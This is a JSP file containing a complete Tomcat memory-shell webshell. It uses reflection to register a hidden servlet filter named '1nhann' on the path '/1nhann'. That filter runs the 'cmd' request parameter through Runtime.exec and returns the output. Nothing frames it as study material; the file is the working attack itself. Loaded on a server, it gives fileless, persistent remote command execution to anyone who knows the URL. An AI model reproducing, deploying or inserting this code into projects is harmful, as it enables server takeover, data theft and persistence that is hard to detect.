<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.loader.WebappClassLoaderBase" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.lang.reflect.Field" %><%
    try {
        StandardContext context = (StandardContext) ((WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()).getResources().getContext();

        Filter filter = new Filter() {
            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletResponse response = (HttpServletResponse) servletResponse;
                HttpServletRequest request = (HttpServletRequest) servletRequest;

                Runtime rt = Runtime.getRuntime();
                String cmd = request.getParameter("cmd");
                Process process = rt.exec(cmd);
                java.io.InputStream in = process.getInputStream();
                PrintWriter writer = response.getWriter();
                java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                String s = null;
                while ((s = stdInput.readLine()) != null) {
                    writer.println(s);
                }
                writer.flush();
                writer.close();
            }
        };

        String name = "1nhann";

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(name);
        filterDef.setFilter(filter);


        Constructor applicationFilterConfig = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class,FilterDef.class});
        applicationFilterConfig.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfig.newInstance(new Object[]{context,filterDef});


        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName(name);
        filterMap.addURLPattern("/1nhann");


        Field field = context.getClass().getDeclaredField("filterConfigs");

        Map<String, ApplicationFilterConfig> filterConfigs = (Map<String, ApplicationFilterConfig>)field.get(context);
        filterConfigs.put(name,filterConfig);
        context.addFilterDef(filterDef);
        context.addFilterMapBefore(filterMap);
    }catch (Exception e){
        e.printStackTrace();
    }
%>
